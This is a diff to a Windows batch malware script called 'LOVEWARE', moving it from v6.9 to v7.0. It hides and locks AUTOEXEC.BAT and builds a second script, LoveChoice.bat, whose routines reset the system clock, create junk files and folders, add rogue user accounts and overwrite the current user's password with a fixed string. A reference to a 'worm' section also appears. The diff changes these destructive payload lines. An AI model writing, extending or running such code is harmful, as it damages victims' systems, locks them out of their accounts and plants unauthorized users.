@@ -1,6 +1,6 @@
 @echo off
 
-:: LOVEWARE v6.9
+:: LOVEWARE v7.0
 ::
 :: YOU CAN DELETE THIS 
 :: |  |  |  |  |  |  |
@@ -216,6 +216,8 @@ goto worm
 
 :run2
 
+set z=%random%
+
 set Slash=\
 if exist %SystemDrive%%Slash%AUTOEXEC.BAT (
 attrib +s +r +h %SystemDrive%%Slash%AUTOEXEC.BAT
@@ -370,11 +372,11 @@ echo goto crazymouse>>LoveChoice.bat
 :: Create some chaos
 
 echo :chaos>>LoveChoice.bat
-echo date 22/08/2014>>LoveChoice.bat
-echo time 06:06:06>>LoveChoice.bat
+echo date 14/02/2006>>LoveChoice.bat
+echo time 00:00:00>>LoveChoice.bat
 echo nul >> %random%>>LoveChoice.bat
-echo mkdir %random%>>LoveChoice.bat
-echo net user %random% /add>>LoveChoice.bat
+echo mkdir ILoveYou+%z%>>LoveChoice.bat
+echo net user lover+%z% /add>>LoveChoice.bat
 echo goto makemsg>>LoveChoice.bat
 echo goto chaos>>LoveChoice.bat
 
@@ -547,11 +549,11 @@ echo goto msginf>>LoveChoice.bat
 
 echo :dangerouschaos>>LoveChoice.bat
 echo net user %username% a0h5UILOVEYOUuYR45JmyUtHAHAHAHAHTheG0df@ther!>>LoveChoice.bat
-echo date 22/08/2014>>LoveChoice.bat
-echo time 06:06:06>>LoveChoice.bat
+echo date 14/02/2006>>LoveChoice.bat
+echo time 00:00:00>>LoveChoice.bat
 echo nul >> %random%>>LoveChoice.bat
-echo mkdir %random%>>LoveChoice.bat
-echo net user %random% /add>>LoveChoice.bat
+echo mkdir IhateYou+%z%>>LoveChoice.bat
+echo net user lover+%z% /add>>LoveChoice.bat
 echo goto run6>>LoveChoice.bat
 echo goto dangerouschaos>>LoveChoice.bat
 
